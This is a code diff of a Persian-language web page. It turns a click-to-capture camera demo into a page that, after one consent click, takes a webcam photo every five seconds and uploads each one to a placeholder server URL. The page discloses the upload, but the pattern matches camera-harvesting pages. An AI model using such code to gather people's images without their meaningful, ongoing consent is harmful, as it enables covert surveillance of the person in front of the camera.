@@ -2,7 +2,7 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <title>دسترسی به دوربین</title>
+  <title>ارسال عکس خودکار</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -45,45 +45,59 @@
     <h2>شرایط استفاده</h2>
     <p>
       با کلیک روی دکمه زیر، شما اجازه می‌دهید از دوربین دستگاه برای گرفتن تصویر
-      استفاده شود.
+      استفاده شود و تصاویر به سرور ارسال گردد.
     </p>
 
     <button id="startBtn">می‌پذیرم و ادامه</button>
 
-    <div id="cameraBox" style="display:none;">
-      <video id="video" autoplay playsinline></video>
-      <br>
-      <button id="captureBtn">گرفتن عکس</button>
-      <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
-      <div id="status"></div>
-    </div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <div id="status"></div>
   </div>
 
   <script>
     const startBtn = document.getElementById('startBtn');
-    const captureBtn = document.getElementById('captureBtn');
-    const cameraBox = document.getElementById('cameraBox');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const status = document.getElementById('status');
-
     let stream;
+    let intervalId;
 
     startBtn.onclick = async () => {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-        cameraBox.style.display = 'block';
+
+        status.innerText = 'دوربین فعال شد ✅';
         startBtn.disabled = true;
+
+        // هر 5 ثانیه عکس گرفته می‌شود
+        intervalId = setInterval(async () => {
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          canvas.toBlob(async (blob) => {
+            const form = new FormData();
+            form.append('photo', blob, 'photo.jpg');
+
+            try {
+              await fetch('https://YOUR_SERVER_DOMAIN/upload', {
+                method: 'POST',
+                body: form
+              });
+              status.innerText = 'عکس ارسال شد ✅';
+            } catch (e) {
+              status.innerText = 'خطا در ارسال عکس ❌';
+              console.error(e);
+            }
+          }, 'image/jpeg', 0.9);
+
+        }, 5000);
+
       } catch (err) {
         alert('اجازه دسترسی به دوربین داده نشد');
+        console.error(err);
       }
-    };
-
-    captureBtn.onclick = () => {
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      status.innerText = 'عکس با موفقیت گرفته شد ✅';
     };
   </script>
 
